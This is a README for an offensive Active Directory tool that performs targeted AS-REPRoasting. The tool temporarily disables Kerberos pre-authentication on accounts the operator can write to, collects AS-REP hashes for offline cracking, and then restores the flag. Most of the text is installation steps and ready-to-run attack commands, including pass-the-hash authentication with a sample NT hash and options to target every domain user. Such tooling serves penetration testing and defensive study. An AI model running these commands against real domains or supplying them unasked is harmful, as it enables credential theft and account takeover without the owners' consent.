# targetedAsreproast

`targetedAsreproast.py` adapts [ShutdownRepo's targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform targeted AS-REPRoasting. Instead of temporarily assigning a Service Principal Name, it temporarily sets the `DONT_REQ_PREAUTH` bit in `userAccountControl`, requests an AS-REP for the account, and removes the bit afterward.

This is useful when an ACL grants write access to `userAccountControl` on one or more user accounts. Depending on the effective permissions, this can include `GenericWrite`, `GenericAll`, or `WriteProperty` specifically over `userAccountControl`. The tool tries accounts individually, so an account that denies the modification does not stop processing the rest.

## How it works

For each selected, enabled user account, the script:

1. Reads `userAccountControl` over LDAP.
2. If `DONT_REQ_PREAUTH` is not already set, attempts to set only that bit, preserving the other UAC flags.
3. Requests an AS-REP from the KDC and formats its encrypted data as a crackable hash.
4. Removes `DONT_REQ_PREAUTH` if the script added it, preserving the account's other UAC flags.

Accounts that already have `DONT_REQ_PREAUTH` set can be requested without changing their UAC. Insufficient access on one account is skipped quietly at normal verbosity, matching `targetedKerberoast`'s behavior. Use `-vv` to see debug messages.

## Installation

Clone the repository, create a virtual environment, and install dependencies inside it:

```bash
git clone https://github.com/gzzcoo/targetedAsreproast.git
cd targetedAsreproast
python3 -m venv venv
source venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

Point the script's shebang at the Python interpreter in this virtual environment and make it executable:

```bash
sed -i "1s|^#!.*|#!$(pwd)/venv/bin/python|" targetedAsreproast.py
chmod +x targetedAsreproast.py
```

Run it directly so the shebang selects the virtual environment:

```bash
./targetedAsreproast.py --help
```

Calling `python3 targetedAsreproast.py` explicitly selects whichever `python3` is on `PATH` and ignores the shebang. If the virtual environment is active, that command uses its interpreter; after deactivating it, use `./targetedAsreproast.py` to keep using the interpreter configured in the shebang.

### Optional: make the command available from any directory

Create a symlink to the executable script. The shebang makes the symlink use the virtual environment's Python:

```bash
sudo ln -s "$(pwd)/targetedAsreproast.py" /usr/local/bin/targetedAsreproast.py
```

Then run it from any directory:

```bash
targetedAsreproast.py --help
```

If the repository is moved, update the shebang from its new location and recreate the symlink if needed.

## Usage

Authenticate with a cleartext password and target every enabled user discovered through LDAP:

```bash
targetedAsreproast.py -d lab.local -u 'user' -p 'Password123!' --dc-ip 10.10.10.10 -o targetedAsreproast_hashes.txt
```

Target one account:

```bash
targetedAsreproast.py -d lab.local -u 'user' -p 'Password123!' --dc-ip 10.10.10.10 --request-user target.user -o target.hash
```

Read account names from a file:

```bash
targetedAsreproast.py -d lab.local -u 'user' -p 'Password123!' --dc-ip 10.10.10.10 -U users.txt -o targetedAsreproast_hashes.txt
```

Use an existing Kerberos credential cache:

```bash
export KRB5CCNAME="$(pwd)/user.ccache"
targetedAsreproast.py -d lab.local -u 'user' -k --no-pass --dc-ip 10.10.10.10 --dc-host DC01 -o targetedAsreproast_hashes.txt
```

Use Pass-the-Hash authentication:

```bash
targetedAsreproast.py -d lab.local -u 'user' -H ':613a519b5b0ef57c07bc6395aa1aff14' --dc-ip 10.10.10.10 -o targetedAsreproast_hashes.txt
```

The default output is Hashcat format. `-f john` follows the output convention of `targetedKerberoast` and prefixes each hash with the username.

## Options

The command line keeps the options from `targetedKerberoast.py`:

| Option | Description |
| --- | --- |
| `-v`, `-vv` | Increase verbosity; `-vv` includes debug messages. |
| `-q` | Suppress informational output. |
| `-D`, `--target-domain` | Domain to request AS-REPs from when different from the authentication domain. |
| `-U`, `--users-file` | File containing one username per line. |
| `--request-user USER` | Process only the specified account. |
| `-o`, `--output-file` | Write hashes to a file. |
| `-f`, `--output-format` | `hashcat` (default) or `john`. |
| `--use-ldaps` | Connect to LDAP over TLS. |
| `--only-abuse` | Only target accounts that do not already have `DONT_REQ_PREAUTH` set. |
| `--no-abuse` | Do not change UAC; request AS-REPs only for accounts that already have the flag set. |
| `--dc-host HOST` | Domain controller hostname, useful for Kerberos LDAP when SMB name discovery is unavailable. |
| `--dc-ip IP` | Domain controller/KDC IP address. |
| `-d`, `--domain DOMAIN` | FQDN of the authentication domain. |
| `-u`, `--user USER` | Authentication username. |
| `-k`, `--kerberos` | Authenticate to LDAP using Kerberos and the credential cache or supplied credentials. |
| `--no-pass` | Do not prompt for a password. |
| `-p`, `--password PASSWORD` | Cleartext authentication password. |
| `-H`, `--hashes [LMHASH:]NTHASH` | NTLM hash authentication. |
| `--aes-key KEY` | AES key for Kerberos authentication. |

Run `targetedAsreproast.py --help` for the full usage text.

## Notes

- `DONT_REQ_PREAUTH` is the `0x400000` bit in `userAccountControl`.
- UAC modifications are temporary and performed one account at a time. The script attempts cleanup in a `finally` block after requesting the AS-REP.
- The account used for LDAP authentication needs effective rights to read and modify `userAccountControl` on the target object. A denied write is skipped; it does not mean the remaining accounts are writable.
- The AS-REP hash is an offline cracking artifact. A successful request does not imply that the account password has been recovered.

## Credits and license

Based on [targetedKerberoast by ShutdownRepo](https://github.com/ShutdownRepo/targetedKerberoast), with the request and temporary LDAP modification adapted for AS-REPRoasting. The upstream project is licensed under GPL-3.0; see its [license](https://github.com/ShutdownRepo/targetedKerberoast/blob/main/LICENSE).
